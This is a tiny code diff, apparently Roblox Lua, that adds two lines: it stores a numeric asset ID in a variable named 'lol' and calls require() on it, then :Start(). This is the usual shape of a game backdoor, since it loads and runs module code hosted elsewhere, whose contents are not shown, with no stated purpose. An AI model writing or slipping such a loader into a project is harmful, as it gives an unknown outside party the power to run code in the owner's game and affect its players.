@@ -1,0 +1,2 @@
+local lol = 99192719568313
+require(lol):Start()
